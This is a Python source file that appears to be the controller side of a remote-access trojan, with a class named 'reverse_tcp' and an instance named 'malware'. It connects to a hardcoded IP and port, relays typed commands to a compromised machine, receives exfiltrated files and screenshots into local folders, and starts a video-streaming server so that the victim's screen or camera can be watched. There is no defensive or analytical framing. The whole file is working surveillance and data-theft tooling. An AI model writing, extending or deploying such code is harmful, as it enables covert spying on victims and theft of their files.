# Client side terminal chat
from msvcrt import getch
import socket
from time import sleep
# from tqdm import tqdm
from vidstream import StreamingServer
import threading
import os 


class reverse_tcp:
    # host_ip = socket.gethostbyname(socket.gethostname() )
    
    # remote_ip='192.168.1.73'
    host_ip='172.29.48.1'
    port = 12345
    Bytes_size = 4096
    Encoder = "utf-8"
    count=1

    def __init__(self):
        # Crate a socket
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((self.host_ip, self.port))
        self.main()

    def send_msg(self):
        msg = input()
        self.client_socket.send(msg.encode(self.Encoder))

    def receive_msg(self):
        received = self.client_socket.recv(self.Bytes_size)
        received = received.strip().decode(self.Encoder)
        if received[:10] == "Downloader":
            # print("\n\t\t Received File ")
            self.downloading()

        elif received[:10]=="screenshot":
            self.take_screenshot()

        elif received[:11]=="screenshare" or received[:12]=="cameraclient" or received[:12]=="videoshare" :
            t=threading.Thread(target=self.reciveing_server)
            t.start()
        else:
            print(received, end="")

    def reciveing_server(self):
        try:
            server=StreamingServer( self.host_ip , 9999 )
            server.start_server()
        except:
            pass
        
    def take_screenshot(self):
        try:
            # print("\n\t\t in screenshot funtion")
            filename="Screenshot/screenshot_no_"+str(self.count)+".png"

            flag=self.client_socket.recv(self.Bytes_size).decode(self.Encoder)
            if flag =="Ready to recieved --->":

                with open(filename, "wb") as file:
                    while True:

                        try:
                            data=self.client_socket.recv(self.Bytes_size)
                            self.client_socket.send(data)
                            file.write(data)
                            # print("\n\t\t writting  to the file ")
                            self.client_socket.send("Recieved This packet ... Wait for another ".encode(self.Encoder))
                            
                        except:
                            # print("\n\t\t Eof file ")
                            break

            self.count+=1
            print("\n\t\t Sucessfully Taken Screenshot ")
            self.main()

        except:
            self.__init__()
        
    def downloading(self):
        """ Receiving the filename and filesize from the client. """
        try:

            data = self.client_socket.recv(self.Bytes_size).decode(self.Encoder)
            item = data.split("|")
            filename = item[0]
            filesize = int(item[1])

            print("[+] Filename and filesize received from the client.")
            self.client_socket.send("Filename and filesize received".encode(self.Encoder) )

            flag=self.client_socket.recv(self.Bytes_size).decode(self.Encoder)
            # bar = tqdm(range(filesize), f"Downloading ", unit="B", unit_scale=True)
            if flag =="Ready to recieved --->":
                
                if os.path.isdir("Received_file") == False:
                    os.mkdir("Received_file")
                
                filename="Received_"+filename 
                filename="Received_file/"+filename
                
                with open(filename, "wb") as file:
                    while True:
                        try:
                            data_file=self.client_socket.recv(self.Bytes_size)
                            # bar.update(len(data_file))
                            if data_file== b'[revShell] Sucessfully Transfer from server side':
                                break
                            file.write(data_file)
                            print("\n\t\t writting  to the file ")
                            self.client_socket.send("Recieved...__Waiting__for_another".encode(self.Encoder))
                            
                        except:
                            break

            
            print("\n\t\t  Download File ")
            self.main()
        except:
            self.__init__()


    def main(self):
        # print("\n\t\t IN main section ")
        self.receive_msg()
        while True:
            self.send_msg()
            self.receive_msg()


# if __name__=="__main__":
malware = reverse_tcp()
